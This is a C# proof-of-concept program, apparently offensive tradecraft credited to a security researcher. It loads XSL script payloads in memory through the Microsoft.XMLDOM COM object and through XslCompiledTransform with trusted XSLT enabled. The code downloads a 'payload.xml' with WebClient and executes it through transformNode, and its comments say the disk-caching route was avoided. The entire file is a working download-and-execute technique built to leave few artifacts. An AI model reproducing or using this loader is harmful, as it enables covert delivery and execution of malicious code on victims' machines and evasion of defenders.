using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Xml;
using System.Xml.XPath;
using System.Xml.Xsl;

namespace COM_XSL_Load_InMem
{
    class Program
    {
        static void Main(string[] args)
        {
            //NATIVE();
            COM();
            Console.ReadLine();
        }

        static void COM()
        {
            string[] args = new string[] { "file:///exploits/COM-XSL-Load-InMem/payload.xml" };

            //Typed up from The Wover ‏ @TheRealWover 08/06/2019
            //Read script from file 
            //string script = File.ReadAllText(args[0]);

            Type comType = Type.GetTypeFromProgID("Microsoft.XMLDOM");

            Console.WriteLine("GUID: {0}\nFullName: {1}\nName: {2}", comType.GUID, comType.FullName, comType.Name);

            var comObject = Activator.CreateInstance(comType);

            //Download from URL
            string xml = new WebClient().DownloadString(args[0]);
            string[] namedArgs = new string[] { xml };

            //Set async field to false
            comType.InvokeMember("async",
                BindingFlags.DeclaredOnly |
                BindingFlags.Public | BindingFlags.NonPublic |
                BindingFlags.Instance | BindingFlags.SetProperty | BindingFlags.SetField, null, comObject, new Object[] { false });

            //Load from file, creates a cache on disk, so nono
            comType.InvokeMember("loadXML", BindingFlags.Static | BindingFlags.InvokeMethod, null, comObject, namedArgs);

            //Transform XSL
            comType.InvokeMember("transformNode", BindingFlags.Static | BindingFlags.InvokeMethod, null, comObject, new Object[] { comObject });
        }
        //This only works on .Net old skool, not core
        static void NATIVE()
        {
            XslCompiledTransform transforma = new XslCompiledTransform();
            transforma.Load("file:///source/COM-XSL-Load-InMem-DotNet/casey-payload.xslt", XsltSettings.TrustedXslt, new XmlUrlResolver());

            transforma.Transform(
                XmlReader.Create(new StringReader(new WebClient().DownloadString("file:///source/COM-XSL-Load-InMem-DotNet/casey-xml.xml")), 
                    new XmlReaderSettings() { Async = true }),
                XmlWriter.Create(new MemoryStream())
            );
        }
    }
}
